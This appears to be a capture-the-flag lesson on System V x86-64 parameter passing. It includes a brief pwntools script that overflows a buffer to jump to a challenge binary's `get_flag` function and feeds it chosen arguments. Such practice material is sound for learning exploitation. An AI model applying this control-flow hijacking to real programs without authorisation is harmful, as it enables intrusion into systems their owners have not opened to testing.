This problem is mostly about learning how function parameters are passed. You
should already know how to get to `get_flag` from previous problems. Once you
get to the function, you need to also have the proper parameters. Linux binaries
follow System V calling conventions. Its important to remember that these are
only conventions, and functions don't have to follow them (but any binary
produced by a sensible compiler will). The first 6 integer/pointer parameters
are passed in `rdi`,`rsi`,`rdx`,`rcx`,`r8`,`r9` in that order. Any more
parameters are pushed onto the stack, to be popped by the function that is being
called.

```python
p = process('params')
# buffer overflow to jump to get_flag
payload = flat({72: e.sym['get_flag']})
p.sendline(payload)
p.sendline('0') # junk value
p.sendline('0') # junk value
p.sendline(str(4)) # param 4
p.sendline(str(0xdeadbeef)) # param 3
p.sendline(str(0xcafebabe)) # param 2
p.sendline(str(0x1337)) # param 1
```

[Further Reading: https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-and-user-space-f](https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-and-user-space-f)

[Wikipedia Link:
https://en.wikipedia.org/wiki/X86_calling_conventions](https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI)
